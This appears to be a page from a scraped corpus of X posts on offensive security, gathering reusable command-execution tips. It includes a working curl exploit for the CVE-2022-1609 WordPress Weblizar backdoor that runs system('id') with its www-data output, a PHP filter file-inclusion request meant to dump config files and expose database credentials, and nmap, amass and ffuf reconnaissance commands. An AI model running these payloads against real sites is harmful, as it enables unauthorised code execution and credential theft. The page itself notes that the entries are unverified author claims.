# X 语料 · 残余回收（命令执行）

来源：X 公开贴子，含可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体）。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[命令与 RCE](../by-type/cmd-injection-rce.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-rce-1（69 条）、x-exp-rce（40 条） · 本文 20 行

- Speed up subdomain brute force with a host that resolves any A record:
  use ffuf to fuzz that host with the subdomains/hosts list
- CVE-2022-1609 WordPress Weblizar Backdoor
  $ curl -s -d 'blowfish=1' -d "blowf=system('id');" 'http://localhost:8888/wp-json/am-member/license'
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
- Nmap reconnaissance
  nmap --script default,safe,discovery -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8880,3000 -n -T4 -iL hosts.txt -oN output
- Reverse Whois : To find other domains purchased by the same user
  amass intel -whois -d
- Local File Inclusion via PHP Filters
  curl 'https://bbt.com/index.php?page=php://filter/convert.base64-encode/resource=config'
  This lets you base64-encode source files — decode to view DB creds or hardcoded secrets
  Make sure you test first manually
